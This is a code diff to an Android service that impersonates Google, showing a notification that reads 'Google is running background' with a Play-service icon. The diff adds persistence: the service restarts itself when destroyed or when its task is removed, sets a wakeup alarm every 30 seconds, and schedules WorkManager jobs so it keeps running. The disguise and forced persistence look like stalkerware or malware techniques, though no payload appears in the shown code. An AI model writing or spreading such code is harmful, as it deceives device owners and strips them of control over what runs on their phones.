@@ -1,17 +1,23 @@
 package com.android.background.services;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.os.IBinder;
+import android.os.SystemClock;
+import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 import com.android.background.services.helpers.NotificationPermissionHelper;
 import com.android.background.services.helpers.NotificationsTest;
 import com.android.background.services.helpers.NotificationsDebug;
+import com.android.background.services.helpers.WorkManagerHelper;
 
 public class MainService extends Service {
 
@@ -35,6 +41,8 @@ public class MainService extends Service {
                 .setContentText("Google is running background")
                 .setSmallIcon(R.drawable.play_service_icon)
                 .setOngoing(true)
+                .setPriority(Notification.PRIORITY_MAX)
+                .setCategory(Notification.CATEGORY_SERVICE)
                 .build();
         startForeground(1, notification);
 
@@ -50,6 +58,12 @@ public class MainService extends Service {
         // Chạy debug notifications để kiểm tra
         NotificationsDebug.debugAllNotifications();
 
+        // Thiết lập alarm để tự khởi động lại
+        setupAutoRestartAlarm();
+        
+        // Khởi động WorkManager để đảm bảo service chạy liên tục
+        WorkManagerHelper.startPeriodicWork(this);
+
         return Service.START_STICKY;
     }
 
@@ -57,6 +71,15 @@ public class MainService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        Log.d("MainService", "Service destroyed, restarting...");
+        
+        // Khởi động lại service ngay lập tức
+        Intent restartIntent = new Intent(this, MainService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(restartIntent);
+        } else {
+            startService(restartIntent);
+        }
     }
 
 
@@ -74,5 +97,35 @@ public class MainService extends Service {
         );
         NotificationManager manager = getSystemService(NotificationManager.class);
         manager.createNotificationChannel(serviceChannel);
+    }
+
+    private void setupAutoRestartAlarm() {
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        Intent intent = new Intent(this, MainService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 
+            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+        // Thiết lập alarm để kiểm tra mỗi 30 giây
+        long triggerTime = SystemClock.elapsedRealtime() + 30000; // 30 giây
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, 
+                triggerTime, pendingIntent);
+        } else {
+            alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 
+                triggerTime, 30000, pendingIntent);
+        }
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Log.d("MainService", "Task removed, restarting service...");
+        
+        // Khởi động lại service khi task bị xóa
+        Intent restartIntent = new Intent(this, MainService.class);
+        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startService(restartIntent);
+        
+        super.onTaskRemoved(rootIntent);
     }
 }
